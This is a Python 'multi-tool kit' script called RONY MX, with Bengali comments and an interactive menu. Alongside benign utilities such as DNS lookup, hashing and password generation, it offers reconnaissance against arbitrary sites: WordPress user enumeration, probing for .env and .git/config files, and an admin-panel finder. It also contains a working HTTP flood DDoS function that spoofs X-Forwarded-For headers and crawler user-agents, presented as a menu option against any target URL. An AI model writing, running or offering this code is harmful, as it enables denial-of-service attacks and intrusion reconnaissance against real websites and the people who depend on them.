#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# RONY MX - মাল্টি-টুল কিট v1.1 (Temp Mail ও Base64 বাদ)

import os
import sys
import time
import json
import socket
import hashlib
import random
import threading
import requests
import urllib3
from urllib.parse import urlparse, urljoin
import dns.resolver
import whois

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== রঙের কোড =====
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
W = '\033[97m'
RESET = '\033[0m'

# ===== ব্যানার =====
def banner():
    os.system('clear')
    print(f"""
{R}╔══════════════════════════════════════════════════════════════╗
{R}║                                                              ║
{R}║  {C}██████╗  ██████╗ ███╗   ██╗██╗   ██╗    ███╗   ███╗██╗  {R}║
{R}║  {C}██╔══██╗██╔═══██╗████╗  ██║╚██╗ ██╔╝    ████╗ ████║╚██╗ {R}║
{R}║  {C}██████╔╝██║   ██║██╔██╗ ██║ ╚████╔╝     ██╔████╔██║ ╚██╗{R}║
{R}║  {C}██╔══██╗██║   ██║██║╚██╗██║  ╚██╔╝      ██║╚██╔╝██║ ██╔╝{R}║
{R}║  {C}██║  ██║╚██████╔╝██║ ╚████║   ██║       ██║ ╚═╝ ██║██╔╝ {R}║
{R}║  {C}╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝╚═╝  {R}║
{R}║                                                              ║
{R}║           {W}RONY MX - MULTI TOOL KIT v1.1{R}                   ║
{R}║           {Y}Author: Rony | Status: Online{R}                    ║
{R}╚══════════════════════════════════════════════════════════════╝
{RESET}""")

# ===== টুলস =====
class RonyMX:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def check_ip(self):
        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=5)
            data = r.json()
            print(f"{G}[+] Public IP: {data['ip']}{RESET}")
            r2 = requests.get(f'http://ip-api.com/json/{data["ip"]}', timeout=5)
            geo = r2.json()
            print(f"{G}[+] Country: {geo.get('country')} | City: {geo.get('city')} | ISP: {geo.get('isp')}{RESET}")
        except Exception as e:
            print(f"{R}[-] Error: {e}{RESET}")

    def website_info(self, url):
        if not url.startswith('http'):
            url = 'https://' + url
        parsed = urlparse(url)
        domain = parsed.netloc
        print(f"{B}[*] Scanning: {url}{RESET}")
        info = {}

        try:
            ips = socket.gethostbyname_ex(domain)[2]
            info['dns_a'] = ips
            print(f"{G}[+] DNS A: {ips}{RESET}")
        except:
            info['dns_a'] = []

        try:
            r = self.session.get(url, timeout=10)
            info['status'] = r.status_code
            info['server'] = r.headers.get('Server', '')
            info['headers'] = dict(r.headers)
            print(f"{G}[+] Status: {r.status_code} | Server: {info['server']}{RESET}")
        except Exception as e:
            print(f"{R}[-] Headers error: {e}{RESET}")

        try:
            w = whois.whois(domain)
            info['whois'] = {'registrar': w.registrar, 'creation': str(w.creation_date)}
            print(f"{G}[+] Registrar: {w.registrar}{RESET}")
        except:
            info['whois'] = {}

        try:
            r = self.session.get(urljoin(url, '/robots.txt'), timeout=5)
            if r.status_code == 200:
                info['robots'] = r.text[:200]
                print(f"{G}[+] robots.txt found{RESET}")
        except:
            pass

        try:
            r = self.session.get(url, timeout=10)
            if 'wp-content' in r.text:
                info['cms'] = 'WordPress'
                print(f"{G}[+] CMS: WordPress{RESET}")
                try:
                    u = self.session.get(urljoin(url, '/wp-json/wp/v2/users'), timeout=5)
                    if u.status_code == 200:
                        users = u.json()
                        info['wp_users'] = [{'id': x['id'], 'name': x.get('name', '')} for x in users]
                        print(f"{G}[+] WP Users: {[x['name'] for x in users]}{RESET}")
                except:
                    pass
        except:
            pass

        dirs = ['/admin', '/login', '/wp-admin', '/phpmyadmin', '/.env', '/.git/config']
        found = []
        for d in dirs:
            try:
                r = self.session.get(urljoin(url, d), timeout=3, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    found.append({'path': d, 'status': r.status_code})
                    print(f"{G}[+] Found: {d} ({r.status_code}){RESET}")
            except:
                pass
        info['common_dirs'] = found

        print(f"{Y}\n[+] Full Info (JSON):{RESET}")
        print(json.dumps(info, indent=2, default=str))
        return info

    def admin_finder(self, url):
        if not url.startswith('http'):
            url = 'https://' + url
        print(f"{B}[*] Looking for admin panel...{RESET}")
        admin_paths = [
            '/admin', '/administrator', '/login', '/wp-admin', '/admin/login',
            '/cpanel', '/webmail', '/phpmyadmin', '/adminpanel', '/dashboard',
            '/manage', '/backend', '/staff', '/moderator', '/controlpanel'
        ]
        found = []
        for path in admin_paths:
            try:
                r = self.session.get(urljoin(url, path), timeout=3, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    found.append({'path': path, 'status': r.status_code, 'redirect': r.headers.get('Location', '')})
                    print(f"{G}[+] {path} -> {r.status_code}{RESET}")
                else:
                    print(f"{W}[-] {path} -> {r.status_code}{RESET}")
            except:
                pass
        if found:
            print(f"{G}[+] Admin panel(s) found: {len(found)}{RESET}")
        else:
            print(f"{R}[-] No admin panel found.{RESET}")
        return found

    def ddos_attack(self, url, threads=50, duration=30):
        if not url.startswith('http'):
            url = 'https://' + url
        print(f"{R}[!] DDoS Attack started on {url} with {threads} threads for {duration}s{RESET}")
        stop = time.time() + duration
        sent = 0

        def flood():
            nonlocal sent
            while time.time() < stop:
                try:
                    payload = str(random.randint(1000000, 9999999))
                    headers = {
                        'User-Agent': random.choice(['Mozilla/5.0', 'Googlebot', 'Bingbot', 'DuckDuckBot']),
                        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                        'Referer': random.choice([url, 'https://google.com', 'https://bing.com'])
                    }
                    self.session.get(url, headers=headers, timeout=1)
                    self.session.post(url, data={'spam': payload}, headers=headers, timeout=1)
                    sent += 1
                except:
                    pass

        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()

        time.sleep(duration)
        print(f"{G}[+] Attack finished. Total requests: {sent}{RESET}")

    def password_generator(self, length=16):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
        pwd = ''.join(random.choice(chars) for _ in range(length))
        print(f"{G}[+] Generated Password: {pwd}{RESET}")
        return pwd

    def hash_generator(self, text):
        print(f"{B}[*] Hashing: {text}{RESET}")
        for algo in ['md5', 'sha1', 'sha256', 'sha512']:
            h = hashlib.new(algo, text.encode()).hexdigest()
            print(f"{G}[+] {algo.upper()}: {h}{RESET}")

    def port_scanner(self, host, ports='21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080'):
        print(f"{B}[*] Scanning {host} for ports: {ports}{RESET}")
        ports = [int(p.strip()) for p in ports.split(',')]
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"{G}[+] Port {port} OPEN{RESET}")
                sock.close()
            except:
                pass
        if not open_ports:
            print(f"{R}[-] No open ports found.{RESET}")
        return open_ports

    def dns_lookup(self, domain):
        print(f"{B}[*] DNS Lookup for {domain}{RESET}")
        try:
            ips = socket.gethostbyname_ex(domain)[2]
            print(f"{G}[+] A Records: {ips}{RESET}")
        except:
            print(f"{R}[-] A Records not found{RESET}")
        for q in ['MX', 'NS', 'TXT']:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8']
                ans = resolver.resolve(domain, q)
                print(f"{G}[+] {q}: {[str(r) for r in ans]}{RESET}")
            except:
                pass

# ===== মেনু =====
def menu():
    tool = RonyMX()
    while True:
        banner()
        print(f"""
{C}╔═══════════════════════════════════════════════════════════════╗
{C}║                    SELECT AN OPTION                            ║
{C}╠═══════════════════════════════════════════════════════════════╣
{C}║  {W}1. Check System & Public IP{RESET}                              {C}║
{C}║  {W}2. Website Info (DNS, Headers, CMS, Users){RESET}              {C}║
{C}║  {W}3. Admin Panel Finder{RESET}                                  {C}║
{C}║  {W}4. DDoS Attack (Layer 7){RESET}                               {C}║
{C}║  {W}5. Secure Password Generator{RESET}                           {C}║
{C}║  {W}6. IP Geolocation Lookup{RESET}                               {C}║
{C}║  {W}7. DNS Records Lookup{RESET}                                  {C}║
{C}║  {W}8. Hash Generator (MD5, SHA1, SHA256, SHA512){RESET}         {C}║
{C}║  {W}9. Port Scanner{RESET}                                       {C}║
{C}║  {W}10. Exit Tool{RESET}                                          {C}║
{C}╚═══════════════════════════════════════════════════════════════╝
{RESET}""")
        choice = input(f"{Y}Select option >> {RESET}").strip()
        
        if choice == '1':
            tool.check_ip()
        elif choice == '2':
            url = input(f"{Y}Enter website URL: {RESET}").strip()
            tool.website_info(url)
        elif choice == '3':
            url = input(f"{Y}Enter website URL: {RESET}").strip()
            tool.admin_finder(url)
        elif choice == '4':
            url = input(f"{Y}Enter target URL: {RESET}").strip()
            threads = int(input(f"{Y}Threads (default 50): {RESET}") or 50)
            duration = int(input(f"{Y}Duration in seconds (default 30): {RESET}") or 30)
            tool.ddos_attack(url, threads, duration)
        elif choice == '5':
            length = int(input(f"{Y}Password length (default 16): {RESET}") or 16)
            tool.password_generator(length)
        elif choice == '6':
            tool.check_ip()
        elif choice == '7':
            domain = input(f"{Y}Enter domain: {RESET}").strip()
            tool.dns_lookup(domain)
        elif choice == '8':
            text = input(f"{Y}Enter text to hash: {RESET}").strip()
            tool.hash_generator(text)
        elif choice == '9':
            host = input(f"{Y}Enter host/IP: {RESET}").strip()
            ports = input(f"{Y}Ports (comma separated, default 21,22,23,25,53,80,443): {RESET}").strip()
            if not ports:
                ports = '21,22,23,25,53,80,443'
            tool.port_scanner(host, ports)
        elif choice == '10':
            print(f"{R}Exiting...{RESET}")
            sys.exit()
        else:
            print(f"{R}Invalid option!{RESET}")
        input(f"{Y}\nPress Enter to continue...{RESET}")

if __name__ == "__main__":
    menu()
